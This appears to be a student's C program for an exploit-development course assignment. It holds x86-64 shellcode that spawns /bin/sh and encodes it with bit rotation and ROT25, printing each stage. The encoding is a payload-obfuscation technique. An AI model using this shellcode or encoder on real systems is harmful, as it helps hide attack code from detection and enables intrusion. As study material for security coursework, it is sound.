/*
 Author: Guillem Alminyana
 Student ID: PA-14628
 SLAE64 Assignment #4: Custom Encoder
 =====================================

 Compile: 
   gcc Encoder.c -o Encoder
*/

#include <stdio.h>
#include <string.h>

#define BITS_TO_ROTATE	8
#define SHIFTS 		3

unsigned char code[]= \
"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

void main (void)
{


	printf("\nShellCode Length: %d\n", strlen(code)); 

	printf("\nOriginal ShellCode:\n");

	for (int i = 0; i < strlen(code); i++) {
		printf("0x%02x,", code[i]);
	}

	printf("\n\nShifted Left 3 bits ShellCode:\n");

	// 3 bits left Rotation
	for (int i = 0; i< strlen(code); i++) {
		code[i] = (code[i] << SHIFTS) | ( code[i] >> (BITS_TO_ROTATE - SHIFTS));
		printf("0x%02x,", code[i]);
	}

	printf("\n\nROT25 ShellCode:\n");

	// ROTX the ShellCode
	unsigned char rot = 25;
	unsigned char max_rot = 256 - rot;

	for (int i = 0; i < strlen(code); i++) {
		if (code[i] < max_rot) {
			code[i] = code[i] + rot;
			printf("0x%02x,",code[i]);
		} else {
			code[i] = (code[i] + rot) - 256;
			printf("0x%02x,",code[i]);
		}
	}
		
	printf("\n");

}	

